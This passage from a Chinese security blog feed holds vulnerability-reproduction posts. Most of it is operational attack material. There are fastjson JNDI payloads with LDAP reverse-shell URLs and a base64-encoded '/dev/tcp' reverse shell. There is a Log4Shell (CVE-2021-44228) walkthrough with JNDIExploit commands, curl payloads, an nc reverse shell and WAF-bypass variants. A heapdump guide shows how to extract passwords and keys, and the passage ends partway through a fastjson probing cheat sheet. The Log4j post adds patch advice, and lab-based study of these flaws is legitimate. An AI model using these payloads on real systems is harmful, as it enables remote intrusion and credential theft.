class="hljs-string">&quot;ldap://vps_ip:11389/Basic/ReverseShell/vps_ip/18888&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="LDAP命令大全"><a href="#LDAP命令大全" class="headerlink" title="LDAP命令大全"></a>LDAP命令大全</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 命令执行回显,在请求头中添加cmd字段和要执行的命令</span><br>cmd:whoami<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Basic/TomcatEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Basic/SpringEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Basic/WeblogicEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Deserialization/CommonsBeanutils2/TomcatEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Deserialization/C3P0/SpringEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/Deserialization/Jdk7u21/WeblogicEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/TomcatBypass/TomcatEcho<br>ldap://vps_ip:<span class="hljs-number">1389</span>/TomcatBypass/SpringEcho<br><br><span class="hljs-comment"># 反弹shell</span><br>nc -lvp <span class="hljs-number">8888</span><br>ldap://vps_ip:<span class="hljs-number">1389</span>/Basic/ReverseShell/vps_ip/<span class="hljs-number">8888</span><br><span class="hljs-comment"># Base64编码后的‘+’使用url编码‘%2b’替换（bash -i &gt;&amp; /dev/tcp/vps_ip/8888 0&gt;&amp;1）</span><br>ldap://vps_ip:<span class="hljs-number">1389</span>/TomcatBypass/Command/Base64/YmFzaCAtaSA%2bJiAvNGV2L3RjcC8xMjEuCC42OS4yNC84ODg4IDA%2bJjE=<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>fastjson</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Apache Log4j2 RCE (CVE-2021-44228)</title>
    <link href="/2024/08/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Apache%20Log4j2%20RCE%20(CVE-2021-44228)/"/>
    <url>/2024/08/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Apache%20Log4j2%20RCE%20(CVE-2021-44228)/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-简介"><a href="#📌-简介" class="headerlink" title="📌 简介"></a>📌 简介</h2><p>Log4j2 是 Java 生态中使用最广泛的日志框架之一。<br>CVE-2021-44228（俗称 Log4Shell）允许远程攻击者通过 JNDI 注入执行任意代码。</p><ul><li><strong>影响版本：</strong> 2.0-beta9 ~ 2.14.1</li><li><strong>修复版本：</strong> &gt;&#x3D; 2.15.0</li><li><strong>危害：</strong> RCE，完全控制目标服务器</li></ul><hr><h2 id="🐳-靶场环境-Vulhub"><a href="#🐳-靶场环境-Vulhub" class="headerlink" title="🐳 靶场环境 - Vulhub"></a>🐳 靶场环境 - Vulhub</h2><p><a href="https://github.com/vulhub/vulhub">Vulhub</a> 是一个基于 Docker 的漏洞测试平台。</p><p><strong>快速启动：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 克隆 Vulhub</span><br>git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class="hljs-comment"># 进入对应环境</span><br><span class="hljs-built_in">cd</span> vulhub/log4j/CVE-2021-44228/<br><br><span class="hljs-comment"># 启动漏洞环境</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>访问：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.199.132:8983/</span><br></code></pre></td></tr></table></figure><p>示例页面：<br><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704509127402-5c5455f8-9521-426f-bd00-e43d6955e13f.png" alt="Log4j Vulhub 环境"></p><hr><h2 id="⚙️-漏洞复现"><a href="#⚙️-漏洞复现" class="headerlink" title="⚙️ 漏洞复现"></a>⚙️ 漏洞复现</h2><h3 id="Step-1️⃣-启动-JNDIExploit-服务器"><a href="#Step-1️⃣-启动-JNDIExploit-服务器" class="headerlink" title="Step 1️⃣ - 启动 JNDIExploit 服务器"></a>Step 1️⃣ - 启动 JNDIExploit 服务器</h3><p>在公网（或内网互通）机器上，开启 <code>JNDIExploit</code> 工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &lt;VPS_IP&gt; -l 11389 -p 18080<br></code></pre></td></tr></table></figure><ul><li><code>-i</code>：监听 IP</li><li><code>-l</code>：LDAP 服务端口（默认 1389，这里示例改为 11389）</li><li><code>-p</code>：HTTP Payload 服务端口</li></ul><hr><h3 id="Step-2️⃣-发送恶意-Payload"><a href="#Step-2️⃣-发送恶意-Payload" class="headerlink" title="Step 2️⃣ - 发送恶意 Payload"></a>Step 2️⃣ - 发送恶意 Payload</h3><p>向目标服务发送含有 <code>$&#123;jndi:ldap://...&#125;</code> 的恶意数据。</p><p><strong>示例：在 Header 里执行命令：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.132:8983<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>$&#123;jndi:ldap://&lt;VPS_IP&gt;:11389/Basic/TomcatEcho&#125;<br><span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>whoami<br></code></pre></td></tr></table></figure><ul><li><code>TomcatEcho</code> 是 JNDIExploit 内置的命令执行 gadget。</li><li>通过 <code>cmd</code> 参数，写要执行的系统命令。</li></ul><hr><h3 id="Step-3️⃣-查看命令回显"><a href="#Step-3️⃣-查看命令回显" class="headerlink" title="Step 3️⃣ - 查看命令回显"></a>Step 3️⃣ - 查看命令回显</h3><p>在浏览器或 curl 中访问后，如果目标可用，将执行命令并回显在响应中。</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;cmd: whoami&quot;</span> -H <span class="hljs-string">&quot;User-Agent: <span class="hljs-variable">$&#123;jndi:ldap://&lt;VPS_IP&gt;:11389/Basic/TomcatEcho&#125;</span>&quot;</span> http://192.168.199.132:8983/<br></code></pre></td></tr></table></figure><p>命令执行效果：<br><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123817821.png" alt="RCE效果"></p><hr><h3 id="Step-4️⃣-反弹-shell"><a href="#Step-4️⃣-反弹-shell" class="headerlink" title="Step 4️⃣ - 反弹 shell"></a>Step 4️⃣ - 反弹 shell</h3><p>开启本地监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 8888<br></code></pre></td></tr></table></figure><p>发送反弹 shell Payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>$&#123;jndi:ldap://&lt;VPS_IP&gt;:11389/Basic/ReverseShell/&lt;VPS_IP&gt;/8888&#125;<br></code></pre></td></tr></table></figure><p>目标触发后，会连回你的监听端口，获取 shell。</p><hr><h2 id="⚠️-常见绕过点"><a href="#⚠️-常见绕过点" class="headerlink" title="⚠️ 常见绕过点"></a>⚠️ 常见绕过点</h2><ul><li><p>一些目标可能做了 WAF，拦截 <code>$&#123;jndi:ldap://</code>，可尝试变体：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:ldap://...&#125;<br></code></pre></td></tr></table></figure></li><li><p>一些环境使用 <code>rmi://</code> 代替 <code>ldap://</code> 也可尝试：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$&#123;jndi:rmi://&lt;VPS_IP&gt;:1099/Exploit&#125;<br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="🛡️-修复建议"><a href="#🛡️-修复建议" class="headerlink" title="🛡️ 修复建议"></a>🛡️ 修复建议</h2><p>✅ <strong>官方修复方式：</strong></p><ol><li><p>升级 Log4j2 至 <code>2.17.0</code> 或以上。</p></li><li><p>若暂时无法升级：</p><ul><li>设置 <code>log4j2.formatMsgNoLookups=true</code></li><li>移除 <code>JndiLookup</code> 类</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class<br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="📌-参考链接"><a href="#📌-参考链接" class="headerlink" title="📌 参考链接"></a>📌 参考链接</h2><ul><li><a href="https://logging.apache.org/log4j/2.x/security.html">CVE-2021-44228 官方公告</a></li><li><a href="https://github.com/vulhub/vulhub">Vulhub 漏洞环境</a></li></ul><hr><h2 id="✅-总结"><a href="#✅-总结" class="headerlink" title="✅ 总结"></a>✅ 总结</h2><p>Log4Shell 是影响范围极大的 RCE 漏洞，通过 JNDI 注入可实现远程命令执行甚至反弹 shell，<br>安全研究者可利用 Vulhub 快速搭建环境复现与分析。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Log4j2</tag>
      
      <tag>反序列化</tag>
      
      <tag>JNDI注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 heapdump 文件，提取明文密码、密钥等敏感信息</title>
    <link href="/2024/08/23/%E5%88%A9%E7%94%A8%20heapdump%20%E6%96%87%E4%BB%B6%EF%BC%8C%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E3%80%81%E5%AF%86%E9%92%A5%E7%AD%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    <url>/2024/08/23/%E5%88%A9%E7%94%A8%20heapdump%20%E6%96%87%E4%BB%B6%EF%BC%8C%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E3%80%81%E5%AF%86%E9%92%A5%E7%AD%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h4 id="🚀-简介"><a href="#🚀-简介" class="headerlink" title="🚀 简介"></a>🚀 简介</h4><p>在渗透测试中，常见Spring应用暴露的heapdump文件能够被下载，但很多测试者不知道如何高效利用。本文分享几款实用工具，帮助最大化利用heapdump漏洞，快速提取明文密码、密钥等敏感信息，从而助力后续深度渗透。</p><hr><h4 id="📌-漏洞发现与利用流程"><a href="#📌-漏洞发现与利用流程" class="headerlink" title="📌 漏洞发现与利用流程"></a>📌 漏洞发现与利用流程</h4><ol><li><p>查看暴露的Actuator端点<br><a href="http://127.0.0.1:8088/actuator">http://127.0.0.1:8088/actuator</a></p></li><li><p>下载heapdump文件<br><a href="http://127.0.0.1:8088/actuator/heapdump">http://127.0.0.1:8088/actuator/heapdump</a></p></li></ol><hr><h4 id="🔧-常用工具推荐"><a href="#🔧-常用工具推荐" class="headerlink" title="🔧 常用工具推荐"></a>🔧 常用工具推荐</h4><h5 id="🎯-工具1：JDumpSpider-Heapdump敏感信息提取"><a href="#🎯-工具1：JDumpSpider-Heapdump敏感信息提取" class="headerlink" title="🎯 工具1：JDumpSpider - Heapdump敏感信息提取"></a>🎯 工具1：JDumpSpider - Heapdump敏感信息提取</h5><p>下载地址：<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p><p>功能：自动扫描heapdump，提取密码、密钥、配置信息等敏感数据。</p><p>使用示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704509139252-51b0a11e-1e6b-4528-a1d1-f126ea1ac513.png" alt="JDumpSpider界面预览"></p><hr><h5 id="🔐-工具2：heapdump-tool-多功能heapdump查询"><a href="#🔐-工具2：heapdump-tool-多功能heapdump查询" class="headerlink" title="🔐 工具2：heapdump_tool - 多功能heapdump查询"></a>🔐 工具2：heapdump_tool - 多功能heapdump查询</h5><p>下载地址：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p><p>功能：支持多种敏感信息查询，快速定位明文密码、AK、SK、IP、URL、文件路径、Shiro密钥等。</p><p>常用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar heapdump_tool.jar heapdump<br><br><span class="hljs-comment"># 获取明文密码</span><br>password<br><br><span class="hljs-comment"># 获取IP地址</span><br>getip<br><br><span class="hljs-comment"># 获取URL</span><br>geturl<br><br><span class="hljs-comment"># 获取所有字符串中可能的文件路径和文件名</span><br>getfile<br><br><span class="hljs-comment"># 获取shiro密钥</span><br>shirokey<br></code></pre></td></tr></table></figure><p>效果预览：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704509139017-a59faa64-e403-47bb-ab17-e6a70e2e71e2.png" alt="heapdump\_tool界面1"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704509139117-fc3a4055-1e54-4d99-b48f-3a0b70393611.png" alt="heapdump\_tool界面2"></p><hr><h4 id="💡-小贴士"><a href="#💡-小贴士" class="headerlink" title="💡 小贴士"></a>💡 小贴士</h4><ul><li>heapdump文件体积较大，下载时请保证网络稳定。</li><li>使用工具时建议在内网环境或受控环境中操作，防止泄露敏感信息。</li><li>结合Spring Actuator的其他暴露端点，如env、configprops等，可进一步收集系统配置和敏感信息。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 利用姿势和 payload</title>
    <link href="/2024/08/23/fastjson%20%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E5%92%8C%20payload/"/>
    <url>/2024/08/23/fastjson%20%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E5%92%8C%20payload/</url>
    
    <content type="html"><![CDATA[<h2 id="🚀说明"><a href="#🚀说明" class="headerlink" title="🚀说明"></a>🚀说明</h2><ul><li>本项目涉及的一些姿势和payload是从之前的随手记的笔记直接粘进来的，很多找不到出处了所以来源未贴出来，望师傅们见谅。</li></ul><h2 id="判断是否用了fastjson"><a href="#判断是否用了fastjson" class="headerlink" title="判断是否用了fastjson"></a>判断是否用了fastjson</h2><h3 id="鉴别fastjson"><a href="#鉴别fastjson" class="headerlink" title="鉴别fastjson"></a>鉴别fastjson</h3><p>DNSLOG</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog.com&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog.com&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据解析变化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span>new a(<span class="hljs-number">1</span>)<span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span>x&#x27;<span class="hljs-number">11</span>&#x27;<span class="hljs-punctuation">,</span><span class="hljs-comment">/*\*\/&quot;c&quot;:Set[&#123;&#125;&#123;&#125;],&quot;d&quot;:&quot;\u0000\x00&quot;&#125; &#123;&quot;ext&quot;:&quot;blue&quot;,&quot;name&quot;:&#123;&quot;$ref&quot;:&quot;$.ext&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>根据响应状态</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whatever&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="鉴别org-json"><a href="#鉴别org-json" class="headerlink" title="鉴别org.json"></a>鉴别org.json</h3><p>特殊字符</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span>&#x27;\r&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="鉴别gson"><a href="#鉴别gson" class="headerlink" title="鉴别gson"></a>鉴别gson</h3><p>浮点类型精度丢失</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span><span class="hljs-number">1.111111111111111111111111111</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注释符</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">#\r\n<span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="鉴别jackson"><a href="#鉴别jackson" class="headerlink" title="鉴别jackson"></a>鉴别jackson</h3><p>浮点类型精度丢失</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span><span class="hljs-number">1.111111111111111111111111111</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注释符</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-comment">/*#aaaa</span><br></code></pre></td></tr></table></figure><p>不支持单引号作为界定符</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;a&#x27;<span class="hljs-punctuation">:</span>&#x27;b&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>多余的类成员</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果目标回显详细报错信息，稍微破坏一下json结构，比如多一个{，比如简简单单把{}变成a。就可以看出来到底是不是jackson。<br>如果目标不回显详细报错信息，而是只有一个500或者error，那么jackson不允许存在不相关的键值，fastjson允许这个特性就可以派上用场了。<br>比如原json如下。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pageNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>加上一个不相关的键值</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pageNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>jackson就会报错，fastjson则不会，而是和之前一模一样。</p><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><h3 id="无报错信息探测"><a href="#无报错信息探测" class="headerlink" title="无报错信息探测"></a>无报错信息探测</h3><p><a href="https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA">https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA</a><br>【不报错】1.2.83&#x2F;1.2.24<br>【报错】1.2.25-1.2.80</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;zero&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.XxException&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>【不报错】1.2.24-1.2.68<br>【报错】1.2.70-1.2.83</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;zero&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>【不报错】1.2.24-1.2.47<br>【报错】1.2.48-1.2.83</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>【不报错】1.2.24<br>【报错】1.2.25-1.2.83</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;zero&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="延迟探测"><a href="#延迟探测" class="headerlink" title="延迟探测"></a>延迟探测</h3><p>原理同ssrf漏洞。请求本机已开放端口不延时，请求不开放的端口则延时。<br>fastjson 1.1.15-1.2.24</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/badClassName&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通用payload,可用于parseObject的场景</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:8088/badClassName&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson 1.2.9-1.2.47</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span 